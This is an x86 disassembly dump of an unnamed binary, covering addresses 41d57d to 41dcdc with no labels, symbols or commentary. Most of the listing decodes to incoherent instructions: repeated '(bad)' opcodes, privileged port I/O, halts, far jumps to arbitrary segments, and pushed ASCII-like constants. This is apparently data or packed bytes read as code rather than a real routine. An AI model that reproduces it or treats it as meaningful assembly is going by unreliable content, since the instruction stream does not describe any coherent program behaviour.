  41d57d:	ja     0x41d50b
  41d57f:	je     0x41d50d
  41d581:	jne    0x41d50f
  41d583:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  41d58a:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  41d590:	lods   al,BYTE PTR ds:[esi]
  41d591:	jge    0x41d54f
  41d593:	jge    0x41d533
  41d595:	(bad)  
  41d596:	jns    0x41d60b
  41d598:	mov    ecx,0x7d738cb1
  41d59d:	ins    DWORD PTR es:[edi],dx
  41d59e:	enter  0x9fc6,0x26
  41d5a2:	jb     0x41d5a7
  41d5a4:	test   eax,0xb956bb17
  41d5a9:	hlt    
  41d5aa:	test   al,0x37
  41d5ac:	test   al,0x7e
  41d5ae:	fnstenv [ecx-0x6a]
  41d5b1:	mov    cl,0x6a
  41d5b3:	push   0xffffffce
  41d5b5:	or     BYTE PTR [edx],bl
  41d5b7:	xlat   BYTE PTR ds:[ebx]
  41d5b8:	out    dx,eax
  41d5b9:	add    eax,0x9321d7aa
  41d5be:	scas   al,BYTE PTR es:[edi]
  41d5bf:	adc    DWORD PTR [esi],esp
  41d5c1:	jge    0x41d5e6
  41d5c3:	fidiv  WORD PTR [edi]
  41d5c5:	leave  
  41d5c6:	hlt    
  41d5c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5c8:	cmp    ax,0x1fc8
  41d5cc:	mov    dh,cl
  41d5ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5cf:	(bad)  
  41d5d0:	and    DWORD PTR [eax],ebx
  41d5d2:	and    DWORD PTR [ecx-0x18],esi
  41d5d5:	(bad)  [ebx+0x7]
  41d5d8:	cmc    
  41d5d9:	enter  0x301a,0x40
  41d5dd:	adc    BYTE PTR [edx+0x0],al
  41d5e0:	jno    0x41d648
  41d5e2:	jp     0x41d652
  41d5e4:	dec    eax
  41d5e5:	aam    0x41
  41d5e7:	add    BYTE PTR [esp+edx*8-0x12f7ffbf],ch
  41d5ee:	adc    al,BYTE PTR [edi]
  41d5f0:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  41d5f7:	ins    BYTE PTR es:[edi],dx
  41d5f8:	push   0x49657557
  41d5fd:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  41d603:	push   edi
  41d604:	ins    BYTE PTR es:[edi],dx
  41d605:	inc    edx
  41d606:	push   0x76666a73
  41d60b:	inc    edx
  41d60c:	jo     0x41d657
  41d60e:	dec    ebp
  41d60f:	dec    ebp
  41d610:	pop    edx
  41d611:	jp     0x41d66d
  41d613:	jbe    0x41d65b
  41d615:	pop    ecx
  41d616:	jo     0x41d690
	...
  41d62c:	inc    ebp
  41d62d:	push   edx
  41d62e:	jb     0x41d6a4
  41d630:	inc    esi
  41d631:	je     0x41d674
  41d633:	inc    esi
  41d634:	jae    0x41d6ac
  41d636:	dec    ebx
  41d637:	gs inc edx
  41d639:	inc    bx
  41d63b:	push   ebp
  41d63c:	jno    0x41d6b4
  41d63e:	ja     0x41d6a7
  41d640:	dec    edi
  41d641:	dec    esp
  41d642:	dec    ebp
  41d643:	inc    edx
  41d644:	jno    0x41d6b7
  41d646:	jae    0x41d69b
  41d648:	dec    eax
  41d649:	inc    ebp
  41d64a:	inc    esp
  41d64b:	inc    esp
  41d64c:	push   ecx
  41d64d:	dec    edx
  41d64e:	ins    BYTE PTR es:[edi],dx
  41d64f:	dec    ebx
  41d650:	jbe    0x41d6c0
  41d652:	pop    eax
  41d653:	jbe    0x41d6a0
  41d655:	inc    ecx
  41d656:	fs gs jno 0x41d6c7
  41d65a:	push   ebx
  41d65b:	inc    ecx
  41d65c:	add    BYTE PTR [eax],al
  41d65e:	inc    ebx
  41d65f:	outs   dx,BYTE PTR ds:[esi]
  41d660:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  41d664:	push   edx
  41d665:	push   ecx
  41d666:	push   0x74000064
  41d66b:	jne    0x41d6e2
  41d66d:	ins    DWORD PTR es:[edi],dx
  41d66e:	push   ecx
  41d66f:	push   eax
  41d670:	jo     0x41d6ec
  41d672:	addr16 jo 0x41d6cb
  41d675:	pop    eax
  41d676:	add    BYTE PTR [eax],al
  41d678:	push   ecx
  41d679:	pop    ecx
  41d67a:	inc    ebx
  41d67b:	inc    edx
  41d67c:	outs   dx,BYTE PTR ds:[esi]
  41d67d:	popa   
  41d67e:	imul   eax,DWORD PTR [edx+0x61],0x6b
  41d682:	jne    0x41d6f2
  41d684:	dec    ebx
  41d685:	add    BYTE PTR [ecx+0x45],bh
  41d688:	bound  ebp,QWORD PTR [ecx+0x46]
  41d68b:	dec    ecx
  41d68c:	ja     0x41d6d3
  41d68e:	dec    eax
  41d68f:	inc    ebp
  41d690:	inc    edx
  41d691:	push   ebx
  41d692:	add    BYTE PTR [eax],al
  41d694:	je     0x41d6f9
  41d696:	bound  esp,QWORD PTR [edi+0x78]
  41d699:	dec    eax
  41d69a:	bound  edx,QWORD PTR [ebx+0x43]
  41d69d:	pop    eax
  41d69e:	outs   dx,DWORD PTR ds:[esi]
  41d69f:	push   0x4355
  41d6a4:	inc    edi
  41d6a5:	gs ins BYTE PTR es:[edi],dx
  41d6a7:	dec    esp
  41d6a8:	js     0x41d712
  41d6aa:	inc    edx
  41d6ab:	js     0x41d6f3
  41d6ad:	arpl   WORD PTR [eax],ax
  41d6af:	add    BYTE PTR [eax],al
  41d6b1:	add    BYTE PTR [eax],al
  41d6b3:	add    BYTE PTR [edx+0x70],cl
  41d6b6:	jb     0x41d730
  41d6b8:	outs   dx,DWORD PTR ds:[esi]
  41d6b9:	pop    eax
  41d6ba:	dec    ebx
  41d6bb:	push   esp
  41d6bc:	dec    esp
  41d6bd:	jns    0x41d70a
  41d6bf:	js     0x41d739
  41d6c1:	outs   dx,BYTE PTR ds:[esi]
  41d6c2:	pop    ecx
  41d6c3:	jae    0x41d733
  41d6c5:	push   0x43644448
  41d6ca:	arpl   WORD PTR [edx+0x55],sp
  41d6cd:	push   0x42504e67
  41d6d2:	push   ebp
  41d6d3:	je     0x41d74a
  41d6d5:	addr16 dec edi
  41d6d7:	dec    esp
  41d6d8:	inc    edx
  41d6d9:	ins    DWORD PTR es:[edi],dx
  41d6da:	inc    esi
  41d6db:	inc    esi
  41d6dc:	inc    esi
  41d6dd:	arpl   WORD PTR [edx+0x47],bx
  41d6e0:	push   ebp
  41d6e1:	inc    ebx
  41d6e2:	popa   
  41d6e3:	push   edx
  41d6e4:	dec    esp
  41d6e5:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  41d6ec:	push   ecx
  41d6ed:	push   ebx
  41d6ee:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  41d6f5:	dec    edx
  41d6f6:	jns    0x41d761
  41d6f8:	push   edx
  41d6f9:	inc    ebx
  41d6fa:	jo     0x41d771
  41d6fc:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  41d700:	fs push ebx
  41d702:	inc    ebx
  41d703:	push   ebp
  41d704:	push   eax
  41d705:	ja     0x41d781
  41d707:	jp     0x41d756
  41d709:	push   esi
  41d70a:	arpl   WORD PTR gs:[ecx+0x45],si
  41d70e:	dec    edx
  41d70f:	dec    esi
  41d710:	data16 ja 0x41d761
  41d713:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
  41d71a:	dec    esp
  41d71b:	cmp    ebx,ebp
  41d71d:	dec    esp
  41d71e:	lods   eax,DWORD PTR ds:[esi]
  41d71f:	out    dx,al
  41d720:	mov    ebp,0xa53ddffb
  41d725:	js     0x41d6e0
  41d727:	xor    BYTE PTR [edx+0x18],bh
  41d72a:	add    dl,BYTE PTR [esi+edx*4+0xad0001]
  41d731:	add    BYTE PTR [eax],al
  41d733:	in     eax,dx
  41d734:	pop    es
  41d735:	inc    edx
  41d736:	cwde   
  41d737:	pusha  
  41d738:	mov    eax,ds:0xbc1ddd3e
  41d73d:	bound  esi,QWORD PTR [ebx+0x59b086c3]
  41d743:	mov    esi,0xe7cbaa03
  41d748:	push   0x6a9fab8a
  41d74d:	(bad)  
  41d74f:	ret    0xecb3
  41d752:	rcl    BYTE PTR [ebx],cl
  41d754:	and    DWORD PTR [ebp+0xc],ebx
  41d757:	mov    ds:0x1331c563,al
  41d75c:	pop    ecx
  41d75d:	xor    eax,0x55be3df3
  41d762:	(bad)  [ecx+0x3ba2dedc]
  41d768:	xchg   BYTE PTR [eax],ah
  41d76a:	dec    esi
  41d76b:	jl     0x41d71e
  41d76d:	pop    esp
  41d76e:	ja     0x41d783
  41d770:	dec    eax
  41d771:	cs gs xchg ebx,eax
  41d774:	pop    ss
  41d775:	and    edi,eax
  41d777:	sar    DWORD PTR [eax-0x62],cl
  41d77a:	sub    esp,DWORD PTR [esi]
  41d77c:	mov    ds:0x110968c0,al
  41d781:	(bad)  
  41d782:	sti    
  41d783:	out    0x8,eax
  41d785:	mov    bl,0xbb
  41d787:	mov    esi,esp
  41d789:	inc    edi
  41d78a:	repnz adc BYTE PTR [edi-0x7fd9469],ch
  41d791:	ins    DWORD PTR es:[edi],dx
  41d792:	add    al,0x8
  41d794:	das    
  41d795:	or     eax,0xc353f1de
  41d79a:	and    al,0x7c
  41d79c:	sub    DWORD PTR [edx-0x2b],0xffffff8d
  41d7a0:	std    
  41d7a1:	ret    
  41d7a2:	into   
  41d7a3:	aaa    
  41d7a4:	call   0xd87c6060
  41d7a9:	or     edi,DWORD PTR [eax]
  41d7ab:	fcomip st,st(3)
  41d7ad:	ud0    ecx,DWORD PTR [ecx+0x1d9ea190]
  41d7b4:	cmp    eax,0x69014467
  41d7b9:	and    al,0x59
  41d7bb:	fsincos 
  41d7bd:	in     eax,0xac
  41d7bf:	mov    ds:0x300d1bcb,al
  41d7c4:	lea    esi,[ebp+0x70]
  41d7c7:	imul   ecx,DWORD PTR [esi-0x50358c5a],0x7d1d5250
  41d7d1:	ss push esp
  41d7d3:	add    edi,esp
  41d7d5:	and    eax,0xee9b0dd8
  41d7da:	adc    BYTE PTR [edi],cl
  41d7dc:	addr16 jb 0x41d817
  41d7df:	sub    BYTE PTR [eax],al
	...
  41d7e9:	add    BYTE PTR [eax],al
  41d7eb:	sub    BYTE PTR [edx+0x57bf52a5],dh
  41d7f1:	(bad)  
  41d7f2:	cli    
  41d7f3:	jl     0x41d859
  41d7f5:	xlat   BYTE PTR ds:[ebx]
  41d7f6:	push   esi
  41d7f7:	mov    bl,0xab
  41d7f9:	popf   
  41d7fa:	mov    ebp,0x19741
  41d7ff:	lods   eax,DWORD PTR ds:[esi]
  41d800:	add    BYTE PTR [eax],al
  41d802:	add    BYTE PTR [edx],dh
  41d804:	or     BYTE PTR [eax+0x6451ba2b],ch
  41d80a:	mov    dh,0xee
  41d80c:	pop    ebx
  41d80d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d80e:	inc    ebp
  41d80f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d810:	cmp    al,0x3a
  41d812:	stos   DWORD PTR es:[edi],eax
  41d813:	mov    ah,0xd1
  41d815:	cmp    ecx,DWORD PTR [edi-0x58b81b1b]
  41d81b:	in     al,dx
  41d81c:	sub    ch,BYTE PTR [ebx-0xb]
  41d81f:	push   cs
  41d820:	loop   0x41d88d
  41d822:	or     al,0xa9
  41d824:	sbb    BYTE PTR [edi],bl
  41d826:	lock mov bl,0xca
  41d829:	inc    ecx
  41d82a:	fidiv  WORD PTR ds:0xcfe0da20
  41d830:	push   edi
  41d831:	pop    eax
  41d832:	fisttp DWORD PTR [ecx]
  41d834:	dec    ecx
  41d835:	les    edi,FWORD PTR [ebp+0x61eaae96]
  41d83b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d83c:	and    al,0xb9
  41d83e:	(bad)  
  41d840:	sbb    eax,0xdbea6056
  41d845:	jge    0x41d80a
  41d847:	inc    ebp
  41d848:	fwait
  41d849:	add    ebp,ebp
  41d84b:	mov    WORD PTR [ebp+0x68],ss
  41d84e:	and    DWORD PTR [esi+0x67315d5c],ecx
  41d854:	jl     0x41d8b0
  41d856:	jb     0x41d809
  41d858:	mov    al,0xa3
  41d85a:	jae    0x41d8c5
  41d85c:	inc    ebp
  41d85d:	daa    
  41d85e:	out    0x2b,eax
  41d860:	cmp    edx,DWORD PTR [ebp+0x551f54ae]
  41d866:	mov    WORD PTR [edi-0x9f0c910],?
  41d86c:	push   ds
  41d86d:	test   BYTE PTR [ebp+0x6743b3c5],0xb0
  41d874:	je     0x41d8c4
  41d876:	jne    0x41d853
  41d878:	pop    edx
  41d879:	data16 fucom st(1)
  41d87c:	xchg   esp,eax
  41d87d:	loop   0x41d828
  41d87f:	(bad)  
  41d880:	in     eax,0xc7
  41d882:	cld    
  41d883:	xlat   BYTE PTR ds:[ebx]
  41d884:	push   esi
  41d885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d886:	sub    esp,DWORD PTR [edx-0x3507da31]
  41d88c:	pop    esi
  41d88d:	push   edi
  41d88e:	inc    edx
  41d88f:	aad    0x82
  41d891:	jmp    0x41d834
  41d893:	push   edx
  41d894:	sbb    dl,BYTE PTR [ebp+0xfd7d7b8]
  41d89a:	sub    dl,BYTE PTR [ebx]
  41d89c:	jmp    0x138b:0xc13efaef
  41d8a3:	xchg   ecx,eax
  41d8a4:	mov    edx,0x5e7f6dae
  41d8a9:	adc    eax,0xe69d306c
  41d8ae:	push   edx
  41d8af:	ja     0x41d8b1
	...
  41d8b9:	add    BYTE PTR [eax],al
  41d8bb:	mov    bl,0x55
  41d8bd:	jg     0x41d840
  41d8bf:	jmp    FWORD PTR [ebx-0x69418801]
  41d8c5:	push   0x97305757
  41d8ca:	pop    edi
  41d8cb:	out    dx,al
  41d8cc:	xchg   edi,eax
  41d8cd:	add    DWORD PTR [eax],eax
  41d8cf:	lods   eax,DWORD PTR ds:[esi]
  41d8d0:	add    BYTE PTR [eax],al
  41d8d2:	add    BYTE PTR [eax+0x70],dl
  41d8d5:	jge    0x41d891
  41d8d7:	lahf   
  41d8d8:	mov    bh,0x65
  41d8da:	shl    BYTE PTR [esi+0x739148c2],1
  41d8e0:	lods   al,BYTE PTR ds:[esi]
  41d8e1:	ret    
  41d8e2:	pop    esp
  41d8e3:	add    BYTE PTR [eax-0x31],ch
  41d8e6:	mov    ecx,0xe13efe71
  41d8eb:	xor    BYTE PTR [esi],al
  41d8ed:	or     eax,0xbc28d8b5
  41d8f2:	fstp   st(2)
  41d8f4:	jle    0x41d90f
  41d8f6:	or     DWORD PTR [ecx+edi*4+0x6b70bc4a],ebx
  41d8fd:	scas   eax,DWORD PTR es:[edi]
  41d8fe:	jne    0x41d913
  41d900:	jp     0x41d93b
  41d902:	push   ecx
  41d903:	mov    BYTE PTR [esi],0x6e
  41d906:	pop    edx
  41d907:	cs sub eax,0x91721e6c
  41d90d:	sbb    ah,BYTE PTR [eax-0x1aab2bbd]
  41d913:	adc    BYTE PTR [ecx+0x7b4cbe94],0xfa
  41d91a:	cmp    BYTE PTR [edx+eiz*2+0x45f0509],al
  41d921:	adc    al,0xfe
  41d923:	inc    edx
  41d924:	inc    esp
  41d925:	daa    
  41d926:	popf   
  41d927:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d928:	sbb    ah,ch
  41d92a:	xchg   ebx,eax
  41d92b:	stos   BYTE PTR es:[edi],al
  41d92c:	jecxz  0x41d991
  41d92e:	add    ecx,DWORD PTR [ecx+0x35a10f19]
  41d934:	mov    ch,bh
  41d936:	sbb    ch,BYTE PTR [edx+0x2d]
  41d939:	xchg   esp,eax
  41d93a:	mov    dh,0xc4
  41d93c:	arpl   cx,cx
  41d93e:	pop    edx
  41d93f:	(bad)  
  41d940:	in     eax,0x8c
  41d942:	loop   0x41d8da
  41d944:	in     eax,0x6e
  41d946:	pop    ebp
  41d947:	adc    eax,0x8d074d38
  41d94c:	xor    al,0x58
  41d94e:	enter  0xb203,0x15
  41d952:	clc    
  41d953:	mov    eax,0x296468ac
  41d958:	mov    edx,0x7ce01682
  41d95d:	lahf   
  41d95e:	mov    ah,0x49
  41d960:	(bad)  
  41d961:	aam    0x9c
  41d963:	mov    ecx,0x7e556fb6
  41d968:	test   eax,0xc197acb4
  41d96d:	iret   
  41d96e:	sahf   
  41d96f:	adc    eax,0xa1a18d1
  41d974:	adc    BYTE PTR [edi+0x7567bf07],al
  41d97a:	xchg   esp,ebx
  41d97c:	lfs    edi,FWORD PTR [ecx]
  41d97f:	mov    edx,0x0
  41d984:	add    BYTE PTR [eax],al
  41d986:	add    BYTE PTR [eax],al
  41d988:	add    BYTE PTR [eax],al
  41d98a:	add    BYTE PTR [eax],bh
  41d98c:	(bad)  
  41d98d:	cmp    ah,BYTE PTR [esi+edi*8]
  41d990:	in     al,dx
  41d991:	fimul  WORD PTR ds:[edi+0x49ac6bd5]
  41d998:	mov    ah,0x13
  41d99a:	pusha  
  41d99b:	fwait
  41d99c:	cwde   
  41d99d:	add    DWORD PTR [eax],eax
  41d99f:	lods   eax,DWORD PTR ds:[esi]
  41d9a0:	add    BYTE PTR [eax],al
  41d9a2:	add    dh,ah
  41d9a4:	or     esp,DWORD PTR ds:0x6be32a84
  41d9aa:	(bad)  
  41d9ac:	out    dx,al
  41d9ad:	scas   eax,DWORD PTR es:[edi]
  41d9ae:	pop    edx
  41d9af:	pop    ds
  41d9b0:	inc    edi
  41d9b1:	adc    edx,esp
  41d9b3:	dec    esi
  41d9b4:	ins    DWORD PTR es:[edi],dx
  41d9b5:	outs   dx,BYTE PTR ds:[esi]
  41d9b6:	rcr    DWORD PTR [esi],cl
  41d9b8:	jbe    0x41d99f
  41d9ba:	out    0x65,al
  41d9bc:	call   FWORD PTR [esi-0x5e81a70b]
  41d9c2:	aaa    
  41d9c3:	mov    ch,0x57
  41d9c5:	je     0x41d95e
  41d9c7:	icebp  
  41d9c8:	shl    BYTE PTR [edi],cl
  41d9ca:	pop    ebp
  41d9cb:	popf   
  41d9cc:	(bad)  
  41d9cd:	sbb    bl,BYTE PTR [ebx-0x2bbf89a]
  41d9d3:	das    
  41d9d4:	retf   0xd6f7
  41d9d7:	mov    cs,WORD PTR [esi-0x28454439]
  41d9dd:	jge    0x41d9c5
  41d9df:	ret    0xf82b
  41d9e2:	jmp    0x41da50
  41d9e4:	adc    DWORD PTR [edi+0x2],esi
  41d9e7:	std    
  41d9e8:	imul   edx,DWORD PTR ds:0x7a1cd073,0xe8423635
  41d9f2:	and    ah,ch
  41d9f4:	dec    ebx
  41d9f5:	aam    0xc2
  41d9f7:	dec    ebx
  41d9f8:	push   ds
  41d9f9:	add    BYTE PTR [eax-0x45],dh
  41d9fc:	adc    BYTE PTR [esi-0x40cdf7ee],al
  41da02:	scas   al,BYTE PTR es:[edi]
  41da03:	fsubr  st(3),st
  41da05:	in     eax,dx
  41da06:	jbe    0x41d9fc
  41da08:	mov    fs,WORD PTR [ecx+0x6e]
  41da0b:	shrd   DWORD PTR [esi+edx*2],eax,cl
  41da0f:	retf   0x35c8
  41da12:	push   edi
  41da13:	aaa    
  41da14:	outs   dx,DWORD PTR ds:[esi]
  41da15:	push   esi
  41da16:	push   ecx
  41da17:	cdq    
  41da18:	cdq    
  41da19:	cmp    esp,0xfffffffa
  41da1c:	xchg   edx,eax
  41da1d:	pop    ss
  41da1e:	mov    cl,0xc5
  41da20:	rcr    DWORD PTR [edi-0x12],1
  41da23:	inc    ebx
  41da24:	dec    esp
  41da25:	jnp    0x41da12
  41da27:	push   esp
  41da28:	ret    
  41da29:	call   0xf441b8d2
  41da2e:	pop    edx
  41da2f:	jns    0x41d9de
  41da31:	adc    BYTE PTR [edx],ah
  41da33:	mov    ebp,0xec0260bd
  41da38:	(bad)  
  41da39:	mov    dh,0xeb
  41da3b:	sub    bl,ch
  41da3d:	and    esi,DWORD PTR [ecx-0xb]
  41da40:	mov    ch,0xa3
  41da42:	(bad)  
  41da43:	sub    al,0x21
  41da45:	inc    ebp
  41da46:	fsub   DWORD PTR [eax-0x2a8e4e6d]
  41da4c:	int    0xff
  41da4e:	or     esi,DWORD PTR [ebp+0x0]
	...
  41da59:	add    BYTE PTR [eax],al
  41da5b:	fnstenv [esi-0x2490e49a]
  41da61:	std    
  41da62:	neg    BYTE PTR [esi]
  41da64:	sub    esp,DWORD PTR [ebx-0x23]
  41da67:	jg     0x41da7f
  41da69:	fst    DWORD PTR [ebp+0x48]
  41da6c:	cdq    
  41da6d:	add    DWORD PTR [eax],eax
  41da6f:	lods   eax,DWORD PTR ds:[esi]
  41da70:	add    BYTE PTR [eax],al
  41da72:	add    BYTE PTR [edx],dl
  41da74:	sahf   
  41da75:	dec    eax
  41da76:	mov    ds:0xff7e0ed,al
  41da7b:	les    edx,FWORD PTR [ecx]
  41da7d:	aad    0x9f
  41da7f:	std    
  41da80:	cmc    
  41da81:	clc    
  41da82:	fdivr  DWORD PTR [edx-0x5dd2801]
  41da88:	dec    edi
  41da89:	jnp    0x41da64
  41da8b:	jmp    0x41da0d
  41da8d:	popf   
  41da8e:	fwait
  41da8f:	arpl   WORD PTR [ecx-0x42],si
  41da92:	ret    0x9a2c
  41da95:	pop    edx
  41da96:	out    0x4b,eax
  41da98:	lods   al,BYTE PTR ds:[esi]
  41da99:	pop    esp
  41da9a:	push   eax
  41da9b:	mov    dl,0xe2
  41da9d:	mov    al,0x56
  41da9f:	mov    ds:0x6e92676c,al
  41daa4:	test   al,0xf
  41daa6:	pop    DWORD PTR [edx]
  41daa8:	in     eax,dx
  41daa9:	arpl   WORD PTR [eax],bx
  41daab:	add    BYTE PTR [eax],ah
  41daad:	sub    ebp,DWORD PTR [esi+0x235fd5d5]
  41dab3:	add    al,0xa7
  41dab5:	mov    edi,0xe4e62386
  41daba:	mov    ds:0x123a5672,al
  41dabf:	adc    eax,0x159c8765
  41dac4:	mov    eax,0x72719453
  41dac9:	and    DWORD PTR [esi+0x79cf0c78],esi
  41dacf:	dec    ebx
  41dad0:	sbb    ah,BYTE PTR [eax-0x1c8d4069]
  41dad6:	mov    ebx,0x8fd49ac2
  41dadb:	sbb    eax,0x109f554b
  41dae0:	out    0x78,eax
  41dae2:	retf   
  41dae3:	int    0xbf
  41dae5:	jecxz  0x41da8c
  41dae7:	dec    esi
  41dae8:	fcomp  QWORD PTR [edx]
  41daea:	adc    ebp,DWORD PTR [eax]
  41daec:	inc    edi
  41daed:	aad    0x2e
  41daef:	(bad)  
  41daf0:	fidivr DWORD PTR [eax-0x36]
  41daf3:	or     DWORD PTR [eax+ebp*4+0x6c],edx
  41daf7:	je     0x41db10
  41daf9:	ret    0x6f08
  41dafc:	lods   al,BYTE PTR ds:[esi]
  41dafd:	and    ch,dh
  41daff:	add    bl,BYTE PTR [ebx]
  41db01:	scas   al,BYTE PTR es:[edi]
  41db02:	mov    edx,0x555dec6d
  41db07:	push   edx
  41db08:	sbb    eax,0xe8f84058
  41db0d:	ins    DWORD PTR es:[edi],dx
  41db0e:	mov    ecx,0x8a37f69c
  41db13:	test   DWORD PTR [ebp-0x6f],esp
  41db16:	xlat   BYTE PTR ds:[ebx]
  41db17:	jl     0x41daee
  41db19:	aam    0x56
  41db1b:	je     0x41daf4
  41db1d:	jmp    0x42a8a7
	...
  41db2a:	add    dl,bl
  41db2c:	xor    dl,BYTE PTR [edi-0x20500076]
  41db32:	jb     0x41db37
  41db34:	inc    ebp
  41db35:	mov    ds:0x976a5e5c,eax
  41db3a:	inc    ebx
  41db3b:	cmc    
  41db3c:	cdq    
  41db3d:	add    DWORD PTR [eax],eax
  41db3f:	lods   eax,DWORD PTR ds:[esi]
  41db40:	add    BYTE PTR [eax],al
  41db42:	add    bl,ah
  41db44:	push   edi
  41db45:	pop    es
  41db46:	or     al,0x68
  41db48:	mov    eax,0xeee1e2
  41db4d:	add    DWORD PTR [edi-0x1b7d9695],eax
  41db53:	mov    ss,WORD PTR [edx+0x6a869179]
  41db59:	pushf  
  41db5a:	jge    0x41dbce
  41db5c:	mov    edi,0x1f0aef7d
  41db61:	jne    0x41db42
  41db63:	xlat   BYTE PTR ds:[ebx]
  41db64:	ja     0x41db4a
  41db66:	sub    eax,0xf4cfdb89
  41db6b:	and    al,0xb6
  41db6d:	push   edi
  41db6e:	repz add eax,0x12e4a976
  41db74:	shl    BYTE PTR [eax-0x103b93a],1
  41db7a:	scas   al,BYTE PTR es:[edi]
  41db7b:	ret    
  41db7c:	fsub   DWORD PTR [esi+0x4752fabe]
  41db82:	mov    dl,0xd8
  41db84:	jg     0x41db53
  41db86:	call   0xcb6eee73
  41db8b:	rol    DWORD PTR [ebp-0x80],0xa0
  41db8f:	std    
  41db90:	push   esi
  41db91:	pop    ss
  41db92:	pop    edx
  41db93:	mov    bh,0x4a
  41db95:	cmp    DWORD PTR [eax-0x45780162],ebp
  41db9b:	jp     0x41db87
  41db9d:	cdq    
  41db9e:	sub    BYTE PTR [ebx],0x74
  41dba1:	into   
  41dba2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dba3:	fstp   QWORD PTR gs:[edx-0x1f74c038]
  41dbaa:	mov    al,0x6
  41dbac:	into   
  41dbad:	and    eax,0x8e42b74c
  41dbb2:	aam    0x45
  41dbb4:	(bad)  
  41dbb5:	and    ebx,esi
  41dbb7:	neg    BYTE PTR [ecx+edx*4]
  41dbba:	jns    0x41db95
  41dbbc:	inc    edi
  41dbbd:	mov    dl,0x16
  41dbbf:	or     DWORD PTR [eax+0x1e3cf94e],esp
  41dbc5:	mov    ds:0x4a0850b9,eax
  41dbca:	pop    ecx
  41dbcb:	fiadd  WORD PTR [ecx]
  41dbcd:	aaa    
  41dbce:	mov    bl,0x7e
  41dbd0:	sub    BYTE PTR [eax-0x60],0x6a
  41dbd4:	sub    dl,0x40
  41dbd7:	lods   al,BYTE PTR ds:[esi]
  41dbd8:	scas   al,BYTE PTR es:[edi]
  41dbd9:	sar    BYTE PTR [ecx-0x5f],cl
  41dbdc:	lods   eax,DWORD PTR ds:[esi]
  41dbdd:	nop
  41dbde:	int    0x96
  41dbe0:	and    ah,bl
  41dbe2:	inc    edx
  41dbe3:	mov    edx,ecx
  41dbe5:	push   cs
  41dbe6:	cmp    eax,0xb667d50e
  41dbeb:	inc    eax
  41dbec:	mov    bh,0xf2
  41dbee:	bound  esi,QWORD PTR [ebx]
	...
  41dbf8:	add    BYTE PTR [eax],al
  41dbfa:	add    BYTE PTR [eax-0x1c],cl
  41dbfd:	add    ebx,DWORD PTR [ebx-0x8270051]
  41dc03:	pop    esi
  41dc04:	sub    BYTE PTR [eax+0x28befb8f],bl
  41dc0a:	xchg   ebp,eax
  41dc0b:	mov    ds:0xad00019a,al
  41dc10:	add    BYTE PTR [eax],al
  41dc12:	add    BYTE PTR [edi+0x21],al
  41dc15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc16:	jns    0x41dbfb
  41dc18:	or     al,0xf2
  41dc1a:	dec    ebp
  41dc1b:	popf   
  41dc1c:	pop    eax
  41dc1d:	cmp    esp,ebx
  41dc1f:	repnz pop eax
  41dc21:	xlat   BYTE PTR ds:[ebx]
  41dc22:	loop   0x41dc20
  41dc24:	and    al,BYTE PTR [eax+0xb]
  41dc27:	push   ecx
  41dc28:	call   0x1800:0x2e4b5d7d
  41dc2f:	mov    dl,BYTE PTR [edx]
  41dc31:	addr16 jmp 0xe1e6:0x76461b40
  41dc39:	mov    ecx,0xad9fd654
  41dc3e:	ds push cx
  41dc41:	repz xor eax,0x309f5894
  41dc47:	sub    eax,0x8186b866
  41dc4c:	shr    ecx,1
  41dc4e:	and    BYTE PTR [ecx-0x51],ah
  41dc51:	in     eax,dx
  41dc52:	mov    WORD PTR [esi+0x14619971],ds
  41dc58:	stc    
  41dc59:	scas   eax,DWORD PTR es:[edi]
  41dc5a:	add    DWORD PTR [ebx-0x71],ebp
  41dc5d:	ficom  DWORD PTR [edx+0x42dd6608]
  41dc63:	cs xchg ebp,eax
  41dc65:	cmp    DWORD PTR [edi+0x46398b5c],edi
  41dc6b:	ss in  al,dx
  41dc6d:	lods   al,BYTE PTR ds:[esi]
  41dc6e:	ret    
  41dc6f:	int3   
  41dc70:	fiadd  WORD PTR [ebp-0x7f]
  41dc73:	in     al,0x2d
  41dc75:	pushf  
  41dc76:	aam    0x9f
  41dc78:	ficom  DWORD PTR [ecx]
  41dc7a:	not    DWORD PTR ds:0xe41f1453
  41dc80:	int3   
  41dc81:	(bad)  
  41dc82:	ins    DWORD PTR es:[edi],dx
  41dc83:	sbb    al,dl
  41dc85:	fidivr WORD PTR es:[edi+0x56]
  41dc89:	fisub  WORD PTR ds:0xdd5c8934
  41dc8f:	pusha  
  41dc90:	cmp    eax,0x919391f1
  41dc95:	push   ebx
  41dc96:	pushf  
  41dc97:	(bad)  
  41dc98:	in     al,0x48
  41dc9a:	push   0x8010c50c
  41dc9f:	add    ebx,DWORD PTR [ebp+0x65ac6d5a]
  41dca5:	aaa    
  41dca6:	add    DWORD PTR [ecx+0x42],0x7c
  41dcaa:	(bad)  
  41dcab:	cli    
  41dcac:	jnp    0x41dd16
  41dcae:	hlt    
  41dcaf:	mov    eax,ds:0x78cf1068
  41dcb4:	imul   edx,DWORD PTR [ecx+ebx*2],0xffffff9c
  41dcb8:	mov    ebx,0x5a2b4323
  41dcbd:	ja     0x41dcb0
  41dcbf:	jno    0x41dcc1
	...
  41dcc9:	add    BYTE PTR [eax],al
  41dccb:	push   edx
  41dccc:	add    al,0xa2
  41dcce:	xor    dh,0xa6
  41dcd1:	jb     0x41dca7
  41dcd3:	ins    DWORD PTR es:[edi],dx
  41dcd4:	xor    dh,BYTE PTR [edx]
  41dcd6:	and    eax,0x4ca6488d
  41dcdb:	dec    edi
  41dcdc:	fwait
